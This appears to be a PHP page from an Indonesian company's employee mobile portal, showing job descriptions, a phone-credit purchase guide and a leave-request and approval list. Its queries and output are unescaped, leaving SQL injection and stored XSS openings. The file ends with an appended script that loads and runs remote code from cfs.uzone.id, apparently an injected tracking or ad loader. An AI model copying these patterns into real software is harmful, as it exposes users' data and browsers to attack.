<?PHP session_start(); 
include "koneksi.php";
?>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
<meta name="mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<meta name="theme-color" content="#ce3100">
<script type="text/javascript" src="js/jquery-1.4.js"></script>
<link href='https://fonts.googleapis.com/css?family=Poppins:400,600,500,300' rel='stylesheet' type='text/css'>



<link rel="stylesheet" href="css/framework7.material.min.css">
<link rel="stylesheet" href="css/framework7.material.colors.min.css">
<link rel="stylesheet" href="css/font-awesome.min.css">
<link rel="stylesheet" href="css/swipebox.min.css">
<link rel="stylesheet" href="css/maxframes.css">
<script type="text/javascript" src="js/jquery-1.4.js"></script>

	
<script src="js/jq_123.js"></script>
<script src="js/jquery.mobile-1.4.5.js"></script>




 
<div data-page="home" class="page navbar-fixed">
<iframe width=174 height=100 name="gToday:normal:calender/agenda.js" id="gToday:normal:calender/agenda.js" src="calender/ipopeng.htm" scrolling="no" frameborder="0" style="visibility:visible; z-index:999; position:absolute; top:-300px; left:-500px;">
</iframe>	
  <div class="page-content hide-bars-on-scroll" >


    <div class="col-10 textcenter">
 <div class="col-100 content-block">Dibawah ini anda dapat mengakses JOBDESK, ISI PULSA & Melakukan IZIN KERJA.</div>

      <div class="list-block accordion-list">

        <ul>
	<li class="accordion-item"><a href="#" class="item-link item-content">
            <div class="item-inner">
              <div class="item-title">JOBDESK</div>
            </div>
            </a>
            <div class="accordion-item-content">
              <div class="content-block">
                
				<p><strong>JOBDESK <?php echo $_SESSION['jabatan_login'];?></strong></p>
			  <?PHP 
$kueritugas = mysql_query("select * from deksjob where jabatan = '$_SESSION[jabatan_login]'");
$cekjml = mysql_num_rows($kueritugas);
if($cekjml < 1)
{
	echo "<p>Seharusnya anda dapat mengakses jobdesk anda. Apabila jobdesk anda tidak muncul, mohon segera hubungi IT Pusat. Terima kasih.</p>";
}
else
{
	while($cetakjobdesk = mysql_fetch_array($kueritugas))
{

	echo "<p>$cetakjobdesk[uraian_deksjob]</p>";
	
	
}
}
?>		
				</div>
            </div>
          </li>
		  
		  
		  
		  
		  
		  <li class="accordion-item"><a href="#" class="item-link item-content">
            <div class="item-inner">
              <div class="item-title">ISI PULSA</div>
            </div>
            </a>
            <div class="accordion-item-content">
              <div class="content-block">
                
				<p>PANDUAN CARA ISI PULSA KIDO SERVER</p>
				<img src="img/logokidoserver.jpg" width="100%">
			  	<p><strong>
SMS CENTER KIDOSERVER<br>
<a href="tel:085279035757">0852-7903-5757</a> / <a href="tel:085769475394">0857-6947-5394</a><br><br></strong>

Jam Transaksi : 24 Jam Nonstop<br>
Operator Komplain:<br>
<a href="tel:0721700917">0721-700917</a>, <a href="tel:082186690204">0821-8669-0204</a><br>
<a href="tel:081541090009">0815-4109-0009</a>, <br>
BBM D55CA29C<br>
WA 0821-8669-0204<br>
Jam Operator : 08.00 - 21.00 WIB<br><br><br>


<strong>FORMAT TRANSAKSI</strong><br>
Isi Pulsa : [KODE].[NOMOR TUJUAN].[PIN]<br>
Contoh : A10.085212345678.1234<br><br>

Cek Saldo : SAL.[PIN]<br>
Contoh : SAL.1234<br><br>

Cek Harga : HRG.[KODE PRODUK].[PIN]<br>
Contoh : HARGA.A.1234<br><br>

Ganti PIN : PIN.[PIN BARU].[PIN LAMA]<br>
Contoh : PIN.9999.1234<br><br>

Rekap Transaksi : R.[TANGGAL].[PIN]<br>
Contoh : R.16/2.1234<br><br>


Isi Pulsa Listrik : [KODE].[ID PEL].[HP KONSUMEN].[PIN]<br>
Contoh : PLN100.6xxxxxxx.082312345678.1234<br><br><br>

Transaksi dengan nominal & nomor yg sama dapat dilakukan 2 kali dalam sehari dengan menggunakan kode ALTERNATIF (A)<br>
Contoh : TELKOMSEL (AA), AXIS (AXA), THREE (TA), INDOESAT (IA), SMART (SMA), XL (XRA)<br><br>

Transaksi juga bisa via : <br>Kongkow, HangOut, Telegram<br><br>

DEPOSIT PULSA DAPAT DILAKUKAN SECARA CASH DI COUNTER KIDOSERVER PUSAT ATAU PERWAKILAN.<br>
BISA JUGA MELALUI TRANSFER BANK DIBAWAH INI :<br><br>
<img src="img/norekkido.jpg" width="100%"><br>


<br>Setelah transfer mohon segera melakukan konfirmasi melalui TELEPON atau SMS ke Operator KIDOSERVER di 0821-8669-0204 / 0721-700917<br><br>

<img src="img/grosirpulsakido.jpg" width="100%"><br><br><br><br><br><br><br><br><br>

				</p>
				</div>
            </div>
          </li>
		  
		  
		 
          <li class="accordion-item"><a href="#" class="item-link item-content">
            <div class="item-inner">
              <div class="item-title">IZIN KERJA</div>
            </div>
            </a>
            <div class="accordion-item-content">
              <div class="content-block">
			 
	
		<style type="text/css">
  #tampil_modal {
    padding-top: 10em;
    background-color: rgba(0,0,0,0.8);
    position: fixed;
   top: 0%;
        left: 0%;
        width: 100%;
        height: 100%;
        z-index:1001;
    display: block;
	//background-color : yellow;
  }

  #modal{
    padding: 15px;
    
    background: white;
    color: black;
    width: 80%;
    border-radius: 15px;
    margin: 0 auto;
	margin-bottom: 20px;
    margin-top: -130px;

    padding-bottom: 50px;
    z-index: 9;
  }
  #modal_atas{
    width: 100%;
    background:orange;
    padding: 15px;
    margin-left: -15px;
    font-size: 18px;
    margin-top: -15px;
    border-top-left-radius: 15px;
    border-top-right-radius: 15px;
  }
  #oke {
    background:#c0392b;
    border:none;
    float:left;
    width:80px;
    height:auto;
    color: #fff;
    margin-right: 5px;
    cursor: pointer;
  }

  

.back { background-color : white; }
#tgl  {
    width: 100%;
    padding: 10px 20px;
    margin: 8px 0;
    box-sizing: border-box;
    border: none;
    border-bottom: 1px solid red;
}
#jenisizin  {
    width: 100%;
    padding: 7px 20px;
    margin: 8px 0;
    box-sizing: border-box;
    border: none;
    border-bottom: 1px solid red;
}

#uaraian_izin {
	width: 100%;
    padding: 12px 20px;
    margin: 8px 0;
    box-sizing: border-box;
    border: none;
    border-bottom: 1px solid red;
}
.submit {
    width: 100%;
    background-color: #E56717;
    color: white;
    padding: 14px 20px;
    margin: 8px 0;
    border: none;
    border-radius: 4px;
    cursor: pointer;
}

#sim {
    width: 100%;
    background-color: #99FF00;
    color: white;
    padding: 14px 20px;
    margin: 8px 0;
    border: none;
    border-radius: 4px;
    cursor: pointer;
}

.submit:hover {
    background-color: #E56717;
}

</style>	  
	<script type="text/javascript">
	
function approve(id) {
	$("#loadingya").html('<img src="img/loader.gif"/>'); 

$.ajax({
      type: 'POST',
      data: 'id='+id,
      url: 'action.php?pilih=approve_izin_kerja',
      success: function() {

    window.location='tampil_lainya.php';
      }
    });
}
function tampilkan_form()
{
	  $("#id_tampilkan_formya").html("<div id='tampil_modal'><div id='modal'><div id='modal_atas'>Detail Pekerjaan</div><label for='fname'>Tanggal Rencana Izin</label>		<input class='input controls input-append date form_date' id='tgl' name='tgl_rencana_izin' type='text' placeholder=''  onFocus='if(self.gfPop)gfPop.fPopCalendar(document.form_laporan.tgl);return false;'>	<label  for='fname'>Jenis Izin</label><select id='jenisizin' name='jenis_izin'><option value=''>Pilih</option>	<option value='Cuti'>Cuti</option>	<option value='Izin'>Izin</option>	<option value='Sakit'>Sakit</option><option value='Tanpa Ket'>Tanpa Ket</option>	</select>	<label for='fname'>Uraian / Alasan</label><textarea id='uaraian_izin' name='uaraian_izin'></textarea><button id='simpan_izin' class='submit' value='Add Task'>KIRIM</button><br><Br><a onclick='tutuppopup()'>TUTUP</a></div></div>"); 
			
}

$(document).on("pagecreate","#pageone",function()
{
  $(".izin_kerja").on("taphold",function()
  {
		   var tgl_izin = $(this).attr("tgl_izin");
		   var jenis = $(this).attr("jenis");
		   var alasan = $(this).attr("alasan");
		   var tgl = $(this).attr("tgl_approve");
		   var status = $(this).attr("status");
		   var nama_peg = $(this).attr("nama_peg");
			  $("#id_tampilkan_formya").html("<div id='tampil_modal'><div id='modal'><div id='modal_atas'>Detail Izin Kerja</div><p>Nama Pegawai : "+nama_peg+"<br>Tgl Rencana Izin : "+tgl_izin+"<br>Jenis Izin : "+jenis+"<br>Alasan Izin : "+alasan+"<br>Tgl Approve : "+tgl+"<Br>Status Approve : "+status+"<br><Br><a onclick='tutuppopup()'>TUTUP</a></div></div>"); 
			
		   });


  
});
function tutuppopup() 
	{
		$("#id_tampilkan_formya").html(""); 
	}  
	</script>
<style type="text/css">
  #tampil_modal {
    padding-top: 10em;
    background-color: rgba(0,0,0,0.8);
    position: fixed;
   top: 0%;
        left: 0%;
        width: 100%;
        height: 100%;
        z-index:1001;
    display: block;
	//background-color : yellow;
  }

  #modal{
    padding: 15px;
    
    background: white;
    color: black;
    width: 80%;
    border-radius: 15px;
    margin: 0 auto;
	margin-bottom: 20px;
    margin-top: -130px;

    padding-bottom: 50px;
    z-index: 9;
  }
  #modal_atas{
    width: 100%;
    background:orange;
    padding: 15px;
    margin-left: -15px;
    font-size: 18px;
    margin-top: -15px;
    border-top-left-radius: 15px;
    border-top-right-radius: 15px;
  }
  #oke {
    background:#c0392b;
    border:none;
    float:left;
    width:80px;
    height:auto;
    color: #fff;
    margin-right: 5px;
    cursor: pointer;
  }

  </style>	
	  
 <div id="form_klik"> 
<div id="id_tampilkan_formya">
</div>
</div>
  <!--
  <div class="page-content">
  -->
		    <?PHP 
	if (empty($_POST['jenis_izin']))
	{

	}
	else
	{
		echo "<script>alert('Gagal mengirim data');</script>";
	}
	?>
	<?php 

	?>

	









<!-- AWAL SCRIPT UNTUK MENAMPLKAN HALAMAN KIRIM IZIN KERJ -->
<script>    
$(document).ready(function(){
$("#simpan_izin").click(function(){
var alasan = $("#uaraian_izin").val(); var tgl = $("#tgl").val(); var jenisizin = $("#jenisizin").val();
	$.ajax({
     type:"POST",
     url:"simpan_izin_kerja.php",    
     data: "aksi=simpan&alasan=" + alasan+"&tgl="+ tgl +"&jenisizin="+jenisizin,
	 success: function(data){
	alert("Permintaan izin kerja sudah terkirim dan menunggu persetujuan manager SDM."); window.location='tampil_lainya.php';
	},
	 error: function(data){	alert("gAGAL MENGIRIM PERMINTAAN IZIN KERJA"); window.location='tampil_lainya.php'; }
	 });});
});
</script>

<div class="accordion-item"><div class="item-link item-content">Dibawah ini data pengajuan izin, cuti dan libur kerja. Data berwarna hijau adalah pengajuan
yg sudah di approve. Tekan tahan (hold) untuk melihat detail.</div><br><a href="#" class="item-link item-content">Klik disini untuk membuka form pengajuan cuti kerja</a>
            <div class="accordion-item-content"> 
			
			<form  name="form_laporan" method="post" enctype="multipart/form-data" class="formnyaedit" onSubmit="return validasi(this)" >
	
<label for="fname">Tanggal Rencana Izin</label>
			<input class="input controls input-append date form_date" id="tgl" name="tgl_rencana_izin" type="text" placeholder=""  onFocus="if(self.gfPop)gfPop.fPopCalendar(document.form_laporan.tgl);return false;">

	
		
		<label  for="fname">Jenis Izin</label>
			<select id="jenisizin" name="jenis_izin">
				<option value="">Pilih</option>
				<option value="Cuti">Cuti</option>
				<option value="Izin">Izin</option>
				<option value="Sakit">Sakit</option>
				<option value="Tanpa Ket">Tanpa Ket</option>
				
			</select>
		<label for="fname">Uraian / Alasan</label>
			<textarea id="uaraian_izin" name="uaraian_izin"></textarea>
			
    
                <button id="simpan_izin" class="submit" value="Add Task">Ajukan</button>
				</form>        </div>
          </div>
<!-- AKHIR SCRIPT UNTUK MENAMPLKAN HALAMAN KIRIM IZIN KERJ -->


  
	<?php 
	if($_SESSION['jabatan_login'] == "Manager SDM")  
	{
		$sql_izin = "";
	}
	else
	{
		$sql_izin = " where id_peg_izin = '$_SESSION[id_user_login]'";
	}
	$kueri_izin = mysql_query("select * from izin_kerja $sql_izin order by id desc") ;
	$cek_data = mysql_num_rows($kueri_izin);
	?>
	<div id="loadingya">
    <div class="list-block media-list">
      <ul>
	  <div id="tampilkan_job_pending">
	  
	  
	  <div data-role="page" id="pageone">
	  
	  <?php 
	  if($cek_data < 1 )
	{
		echo "Belum ada data";
	}
		else
	{			
	  while( $cetak_izin = mysql_fetch_array($kueri_izin))
	  { 
		$kueri_pegawai = mysql_query ("select * from pegawai where ID = '$cetak_izin[id_peg_izin]'");
		$cetak_nama_peg = mysql_fetch_array($kueri_pegawai);
		if($cetak_izin['status_approve'] == "Sudah")
		{
			$tgl_approve = "$cetak_izin[tgl_approve]";
			$status_approve = "Sudah";
			$warna_tulisan = "white";
		}
		else
		{
			$tgl_approve = " - ";
			$status_approve = "Belum";
			$warna_tulisan = "";
		}
		?>
		<style type="text/css">
		#sudah { background : #52D017; }
		</style>
		
		<div class="izin_kerja" status="<?php echo $status_approve;?>" tgl_approve="<?php echo $tgl_approve; ?>" nama_peg="<?php echo $cetak_nama_peg['nama'];?>" tgl_izin="<?php echo $cetak_izin['tgl_rencana_izin'];?>" jenis="<?php echo $cetak_izin['jenis_izin'];?>" alasan="<?php echo $cetak_izin['uraian'];?>">
		 <li class="swipeout" >
          <div class="swipeout-content" id="<?php if($cetak_izin['status_approve'] == "Sudah") { echo"sudah"; }  ?>">
		  <a  class="item-link item-content">
		  <div class="item-media"><img src="<?php echo "img/user/thumb_$cetak_izin[id_peg_izin].jpg"; ?>" width="80"/></div>
            <div class="item-inner">
			
              <div class="item-title-row">
			 
              <div class="item-title"> <font color="<?php echo $warna_tulisan;?>">Nama <?php echo $cetak_nama_peg['nama'];?></font></div>
			  
              </div>
           <div class="item-subtitle"><font color="<?php echo $warna_tulisan;?>">Alasan Izin : <?php echo $cetak_izin['uraian'];?></font></div>
            <div class="item-text"><font color="<?php echo $warna_tulisan;?>"> Rencana Izin : <?php echo $cetak_izin['tgl_rencana_izin'];?></font></div>
            <div class="item-text"><font color="<?php echo $warna_tulisan;?>"> Status : <?php 	 if($cetak_izin['status_approve'] == "Sudah")   { ECHO " Approved "; } ELSE  {   echo " - ";  }		?> </font></div>
			
            </div>
            </a></div>

          <div class="swipeout-actions-left">
			  <a href="#" class="bg-green swipeout-overswipe demo-reply"><font size="2px">
			  <?php 
			 if($_SESSION['jabatan_login'] == "Manager SDM")  
			 { 
				ECHO "Approve"; } ELSE 
			  { 
			  if($cetak_izin['status_approve'] == "Sudah") 
			  {
				  echo "Approved By Manager SDM";
			  }
			  else
			  {
				  ECHO "Menunggu Persetujuan";
			  }
				
			} ;?> <br><input name="approve" <?php if($_SESSION['jabatan_login'] == "Manager SDM")  { if($cetak_izin['status_approve'] == "Sudah") { echo "checked disabled "; } echo "onclick='approve($cetak_izin[id])'"; } else { echo " disabled "; if($cetak_izin['status_approve'] == "Sudah") { echo "checked "; } } ?> type="checkbox" ></input></font></a>
			 </div>
			  
			  <div class="swipeout-actions-right">
			   <a href="#" class="bg-green swipeout-overswipe demo-reply"><font size="2px">  <?php 
			 if($_SESSION['jabatan_login'] == "Manager SDM")  
			 { 
				ECHO "Approve"; } ELSE 
			  { 
			  if($cetak_izin['status_approve'] == "Sudah") 
			  {
				  echo "Approved By Manager SDM";
			  }
			  else
			  {
				  ECHO "Menunggu Persetujuan";
			  }
				
			} ;?><br><input name="approve" <?php if($_SESSION['jabatan_login'] == "Manager SDM")  { if($cetak_izin['status_approve'] == "Sudah") { echo "checked disabled "; } echo "onclick='approve($cetak_izin[id])'"; } else { echo " disabled "; if($cetak_izin['status_approve'] == "Sudah") { echo "checked "; } } ?> type="checkbox" ></input></font></a>
			
			  </div>
        </li>
		</div>
		<?php
	  }
	}
	  ?>
	  
	  </div>
	  
      </div>
 
      </ul>
	 
    </div>
	</DIV>
  <!--  
</div>
-->

			  
			  
               </div>
            </div>
          </li>
          
        
        
         
        </ul>
      </div>
    </div>
  
      
  
	
	
  </div>
  <!-- TOMBOL -->
 
</div>



<script type="text/javascript" src="js/framework7.min.js"></script> 
<script type="text/javascript" src="js/jquery.swipebox.js"></script> 
<script type="text/javascript" src="js/loader.js"></script>
<script type="text/javascript" src="https://www.google.com/jsapi"></script>
<script type="text/javascript" src="js/masonry.pkgd.min.js"></script>
<script type="text/javascript" src="contactform/validator.js"></script>

<script type="text/javascript" src="js/maxframes.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKUXBMgf6AC9B43FubauR0Pf1VFjHoVCO6ICcSp4JcJ%2bPoS4CZUE%2bMZxyb0IClmz5C85kpQQ%2fXxojWDRqxTEhmPkZ0RNNAICJL7xDjX1zDf%2bJE6Tp1nrdZLXlDyOdAYQvnreUWGE7MhcOV%2fOuXI3l6QWHCzbqflyg4csi3PfBjfhdb%2fT9%2bn1lcXbfvMYBKu3JXat9ut0cU%2b1sBJqBof3Yh26FE1iv5U4afJ9dGkCz0o0n8BlmanzlfXIjp8DWYvUvG8CQLtojoPjR6qnSwEREPAexIiQhUFt0EMyqup50BRbC855EJ1EtyJb6bqB%2f8mN4xtkdP19g7oVkbjJgNIbzVJ%2bLuz0hKa66JpDSfVw%2frO8leC62%2frMj084JEwdZ74mcVDEfmzp8Tz3CJ46C8VKq23sLYKx03HVhoomvjjREyls0s7wyILBtcOT%2bmp95X%2b3UsURifhr%2bXSN%2bRc5wdjLDjFvLg9GTroMQZ" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

